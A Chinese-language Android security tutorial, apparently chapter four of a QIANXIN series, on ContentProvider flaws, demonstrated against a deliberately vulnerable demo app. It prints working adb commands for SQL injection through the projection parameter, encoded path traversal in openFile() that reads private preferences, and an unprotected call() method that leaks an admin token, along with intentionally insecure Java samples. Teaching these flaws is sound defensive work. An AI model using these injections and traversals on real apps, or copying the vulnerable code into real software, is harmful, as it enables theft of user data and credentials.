# Android移动安全第四章_ContentProvider安全
> QIANXIN Team
> 来源：https://forum.butian.net/share/4832

> 系列目录：
> 
> 1.  Android 组件导出安全
> 2.  Android Intent 安全
> 3.  Android Binder 服务安全
> 4.  Android ContentProvider 安全（本章）
> 5.  Android WebView 安全
> 6.  Android UI 欺骗与钓鱼
> 7.  Android Deep Link 安全
> 8.  Android 广播安全
> 9.  Android PendingIntent 安全
> 10.  Android 系统设置安全
> 11.  Android SSRF 与网络安全
> 12.  Android 加密与数据存储安全
> 13.  Android 认证与证书校验
> 14.  Android Zip Slip 路径遍历
> 15.  Android Fragment Injection
> 16.  Android SELinux 与沙箱机制

* * *

## 1\. 前言

Android 的每个 App 都有自己的私有数据目录（/data/data/包名/），其他 App 默认无法访问。但很多场景需要跨应用共享数据——通讯录、媒体库、日历、短信，这些系统数据都需要被多个 App 读取。

ContentProvider 就是为这个需求设计的。它把数据封装成类似数据库表的结构，通过 URI（Uniform Resource Identifier，统一资源标识符）定位，对外提供 query、insert、update、delete 四个标准的 CRUD（Create/Read/Update/Delete，增删改查）操作，以及 openFile（文件访问）和 call（自定义方法调用）两个扩展操作。

外部 App 通过 ContentResolver（内容解析器，系统提供的客户端 API）访问 ContentProvider，不需要知道数据的具体存储方式（SQLite、文件、内存都可以），只需要知道 URI。

ContentProvider 的攻击面比其他三个组件丰富一些。Activity 和 Service 主要是"触发一个动作"，而 ContentProvider 是"读写数据"——它直接操作数据库和文件系统，出问题就是数据泄露或文件读写。

* * *

## 2\. ContentProvider 基础

### 2.1 URI 结构

ContentProvider 通过 URI 定位数据，格式如下：

```php
content:
```

| 部分 | 说明 | 示例 |
| --- | --- | --- |
| content:// | 固定前缀，表示这是一个 ContentProvider URI |  |
| authority | Provider 的唯一标识，通常是包名相关的字符串 | com.example.app.provider |
| path | 数据路径，类似于数据库表名 | users |
| id | 可选，指定某条记录 | 3 |

完整示例：`content://com.example.app.provider/users/3` 表示访问 com.example.app.provider 这个 Provider 中 users 表的第 3 条记录。

### 2.2 六个操作方法

ContentProvider 对外暴露六个方法：

| 方法 | 作用 | 对应 SQL |
| --- | --- | --- |
| query() | 查询数据 | SELECT |
| insert() | 插入数据 | INSERT |
| update() | 更新数据 | UPDATE |
| delete() | 删除数据 | DELETE |
| openFile() | 打开文件，返回文件描述符 | 无 |
| call() | 自定义方法调用 | 无 |

前四个是标准的 CRUD 操作，后两个是扩展功能。openFile() 用于文件共享场景（比如图片、文档），call() 用于不适合 CRUD 模型的自定义操作。

![provider_flow.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-e81a0d8a5591f8d8f16aafa2691693a43fcb7bed.png)

### 2.3 权限控制

ContentProvider 的权限控制在 Manifest 中声明：

```xml
<provider
    android:name=".UserProvider"
    android:authorities="com.example.app.provider"
    android:exported="true"
    android:readPermission="com.example.permission.READ_DATA"
    android:writePermission="com.example.permission.WRITE_DATA" />
```

-   `readPermission`：控制 query() 的访问权限
-   `writePermission`：控制 insert()、update()、delete() 的访问权限
-   `permission`：如果只设置这一个，读写都需要该权限

还可以通过 `<path-permission>` 对不同路径设置不同权限：

```xml
<provider
    android:name=".DataProvider"
    android:authorities="com.example.provider"
    android:exported="true">
    <path-permission
        android:pathPrefix="/public"
        android:readPermission="com.example.permission.READ_PUBLIC" />
    <path-permission
        android:pathPrefix="/private"
        android:readPermission="com.example.permission.READ_PRIVATE"
        android:writePermission="com.example.permission.WRITE_PRIVATE" />
</provider>
```

这样 /public 路径和 /private 路径可以有不同的访问控制。

### 2.4 临时权限授予

有时候需要临时让另一个 App 访问自己 Provider 中的某条数据，但又不想给它永久权限。Android 提供了 `grantUriPermissions` 机制：

```xml
<provider
    android:name=".FileProvider"
    android:authorities="com.example.fileprovider"
    android:exported="false"
    android:grantUriPermissions="true" />
```

配合 Intent 的 `FLAG_GRANT_READ_URI_PERMISSION` 或 `FLAG_GRANT_WRITE_URI_PERMISSION`，可以在启动 Activity 时临时授予对方对特定 URI 的访问权限。权限在接收方 Activity 结束后自动撤销。

第二章讲 Intent Flag 滥用时提到过，如果存在 Intent 重定向漏洞，攻击者可以借此获得对未导出 Provider 的临时访问权限。

* * *

## 3\. 数据泄露

### 3.1 无权限保护的导出 Provider

Provider 导出了，但没有设置任何权限：

```xml
<provider
    android:name=".UserProvider"
    android:authorities="com.example.app.userprovider"
    android:exported="true" />
```

任何 App 都可以通过 ContentResolver 查询其中的数据：

```java
Cursor cursor = getContentResolver().query(
    Uri.parse("content://com.example.app.userprovider/users"),
    null, null, null, null
);
```

下面用配套的演示 App（com.demo.providersecurity）来展示。VulnUserProvider 导出且无权限保护，存储了模拟的用户数据：

```bash
adb shell content query \
    --uri content://com.demo.providersecurity.users/users
```

输出：

```php
Row: 0 _id=1, username=admin, email=admin@internal.com, token=eyJhbGciOiJIUzI1NiJ9.admin
Row: 1 _id=2, username=test_user, email=test@internal.com, token=dGVzdF90b2tlbl8xMjM0
Row: 2 _id=3, username=backup_svc, email=backup@internal.com, token=YmFja3VwX3Rva2VuXzU2Nzg=
```

用户名、邮箱、认证 token 全部暴露。

### 3.2 projection 参数注入

query() 方法的 projection 参数指定要返回哪些列，对应 SQL 的 SELECT 子句。如果 Provider 内部直接把 projection 拼接到 SQL 语句中，攻击者可以注入额外的 SQL 片段。

很多 Provider 底层使用 SQLite（一个轻量级的嵌入式关系数据库，Android 内置支持）存储数据。Android 的 `SQLiteDatabase.query()` 方法会把 projection 数组拼接成 SELECT 子句，不做额外过滤：

```java

@Override
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    SQLiteDatabase db = dbHelper.getReadableDatabase();
    
    return db.query("users", projection, selection, selectionArgs, null, null, sortOrder);
}
```

攻击者可以通过 projection 读取其他表的数据。SQLite 有一个内置表 `sqlite_master`，存储了数据库中所有表和索引的定义。通过注入可以先读取表结构，再针对性地查询：

```bash

adb shell content query \
    --uri content://com.demo.providersecurity.users/users \
    --projection "'* FROM sqlite_master--'"
```

输出：

```php
Row: 0 type=table, name=users, tbl_name=users, rootpage=4, sql=CREATE TABLE users (_id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT NOT NULL,email TEXT,token TEXT)
Row: 1 type=table, name=secrets, tbl_name=secrets, rootpage=6, sql=CREATE TABLE secrets (_id INTEGER PRIMARY KEY AUTOINCREMENT,key_name TEXT NOT NULL,key_value TEXT)
```

发现了一个 secrets 表。继续注入读取它的内容：

```bash
adb shell content query \
    --uri content://com.demo.providersecurity.users/users \
    --projection "'* FROM secrets--'"
```

输出：

```php
Row: 0 _id=1, key_name=master_key, key_value=MK-9a8b7c6d5e4f3a2b1c0d
Row: 1 _id=2, key_name=encryption_iv, key_value=IV-1234567890abcdef
```

通过 projection 注入，从一个只暴露 users 表的 Provider 中读到了 secrets 表的数据。

### 3.3 selection 参数注入

selection 参数对应 SQL 的 WHERE 子句。如果 Provider 没有使用参数化查询（selectionArgs），而是直接拼接 selection 字符串，也存在注入风险：

```java

String where = "username = '" + selection + "'";
cursor = db.rawQuery("SELECT * FROM users WHERE " + where, null);


cursor = db.query("users", null, "username = ?", new String[]{username}, null, null, null);
```

实际中 selection 注入比 projection 注入少见一些，因为 Android 的 `SQLiteDatabase.query()` 方法本身支持 selectionArgs 参数化，很多开发者会自然地使用它。

### 3.4 SQLite 注入的限制

和 MySQL、PostgreSQL 不同，SQLite 的注入利用有一些限制：

-   不支持多语句执行（不能用分号拼接 DROP TABLE 等）
-   不支持 INTO OUTFILE（不能直接写文件）
-   不支持 LOAD\_EXTENSION（默认禁用，不能加载动态库）

所以 SQLite 注入的主要危害是数据读取，而不是命令执行。

* * *

## 4\. openFile() 路径遍历

### 4.1 原理

openFile() 方法根据 URI 返回一个 ParcelFileDescriptor（文件描述符的跨进程包装），让调用方可以读写文件。如果 Provider 在处理 URI 时没有过滤路径中的 `../`（上级目录），攻击者就可以通过路径遍历访问 Provider 所在 App 沙箱内的任意文件。

```java

@Override
public ParcelFileDescriptor openFile(Uri uri, String mode)
        throws FileNotFoundException {
    String filename = uri.getLastPathSegment();
    File file = new File(getContext().getFilesDir(), filename);
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

如果攻击者传入 `content://authority/files/..%2F..%2Fshared_prefs%2Fsecret.xml`（`%2F` 是 `/` 的 URL 编码），`getLastPathSegment()` 返回 `../../shared_prefs/secret.xml`，File 对象解析后指向的就是 App 的 SharedPreferences（Android 提供的轻量级键值对存储，数据保存在 XML 文件中）文件。

### 4.2 getLastPathSegment() 的解码行为

这里有一个容易被忽略的细节：`Uri.getLastPathSegment()` 会自动对 URL 编码进行解码。即使 URI 中写的是 `..%2Fshared_prefs`，`getLastPathSegment()` 返回的是 `../shared_prefs`。

这意味着仅仅检查原始 URI 字符串中是否包含 `../` 是不够的，攻击者可以用 `%2F` 绕过。正确的做法是对 `getLastPathSegment()` 的返回值做检查，或者用 `File.getCanonicalPath()` 验证最终路径是否在允许的目录内。

![provider_path_traversal.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/03/attach-1ccd211a666e14937007693073d2a48b09ff391f.png)

### 4.3 演示

演示 App 的 VulnFileProvider 存在路径遍历漏洞。它的 openFile() 直接用 `getLastPathSegment()` 拼接文件路径，没有做任何过滤。

App 的 SharedPreferences 中存储了一个模拟的 API key：

```bash
adb shell content read \
    --uri content://com.demo.providersecurity.files/files/..%2Fshared_prefs%2Fapp_config.xml
```

输出：

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="debug_mode" value="true" />
    <string name="api_key">sk-demo-4f8a2b1c9d3e7f6a5b0c8d2e</string>
    <string name="server_url">https://api.internal.example.com</string>
</map>
```

通过路径遍历，从一个文件共享 Provider 中读到了 App 私有的配置文件，包括 API key 和内部服务器地址。

* * *

## 5\. call() 方法滥用

### 5.1 原理

call() 是 ContentProvider 的一个通用方法，签名如下：

```java
public Bundle call(String method, String arg, Bundle extras)
```

它不受 readPermission/writePermission 的约束——这两个权限只控制 query/insert/update/delete。call() 方法的权限需要在代码中自行检查。

如果开发者在 call() 中实现了敏感操作但没加权限检查，任何 App 都可以调用：

```java
@Override
public Bundle call(String method, String arg, Bundle extras) {
    if ("reset_password".equals(method)) {
        
        String username = extras.getString("username");
        String newPassword = extras.getString("new_password");
        resetUserPassword(username, newPassword);
        Bundle result = new Bundle();
        result.putBoolean("success", true);
        return result;
    }
    return null;
}
```

### 5.2 演示

演示 App 的 VulnUserProvider 实现了一个 `get_token` 方法，直接返回指定用户的认证 token：

```bash
adb shell content call \
    --uri content://com.demo.providersecurity.users \
    --method get_token \
    --arg admin
```

输出：

```php
Result: Bundle[{token=eyJhbGciOiJIUzI1NiJ9.admin}]
```

不需要任何权限，直接拿到了 admin 用户的 token。

* * *

## 6\. 版本演进

### 6.1 ContentProvider 的默认导出变化

第一章提到过，ContentProvider 的默认导出规则和其他组件不同：

| targetSdk | 默认 exported |
| --- | --- |
| < 17（Android 4.2 之前） | true |
| >= 17 | false |

Android 12（targetSdk 31）进一步要求所有带 intent-filter 的组件必须显式声明 exported。但 ContentProvider 通常不声明 intent-filter，所以这个改动对它的影响不大。

### 6.2 StrictMode 对 file:// URI 的限制

Android 7.0（API 24）开始，StrictMode（严格模式，Android 提供的一种开发期检测机制）禁止在 Intent 中传递 `file://` URI。App 之间共享文件必须通过 FileProvider（Android 提供的一个安全的 ContentProvider 实现，位于 androidx 库中）和 `content://` URI。

这个改动推动了 FileProvider 的普及，但也引入了新的攻击面——如果 FileProvider 的配置不当（比如用 `<root-path>` 共享了整个文件系统），反而比直接用 file:// 更危险。

### 6.3 query() 的 Bundle 参数

Android 8.0（API 26）引入了 `query()` 的 Bundle 重载版本：

```java
public Cursor query(Uri uri, String[] projection, Bundle queryArgs, 
                    CancellationSignal cancellationSignal)
```

queryArgs Bundle 可以包含 selection、selectionArgs、sortOrder 等参数。这个改动本身不影响安全性，但如果 Provider 从 Bundle 中取参数时没有做校验，同样存在注入风险。

* * *

## 7\. 总结

ContentProvider 是 Android 数据共享的标准接口，它的攻击面围绕"数据读写"展开。

回顾一下：

-   导出且无权限保护的 Provider 可以被任何 App 查询，直接导致数据泄露
-   projection 和 selection 参数如果直接拼接到 SQL 中，存在注入风险，通过 sqlite\_master 可以获取完整的表结构
-   openFile() 的路径遍历可以读取 App 沙箱内的任意文件，`getLastPathSegment()` 的自动解码行为容易被忽略
-   call() 方法不受 readPermission/writePermission 约束，需要在代码中单独做权限检查

下一章讲 Android WebView 安全。WebView 是 App 内嵌的浏览器组件，它把 Web 的攻击面引入了 Android 应用——JavaScript 接口、URL 拦截、文件访问，每一个都可能成为漏洞入口。

通过网盘分享的文件：provider安全演示.apk  
链接: [https://pan.baidu.com/s/1TmFzQeI7XXuljQUqPVzIPg?pwd=5gi4](https://pan.baidu.com/s/1TmFzQeI7XXuljQUqPVzIPg?pwd=5gi4) 提取码: 5gi4
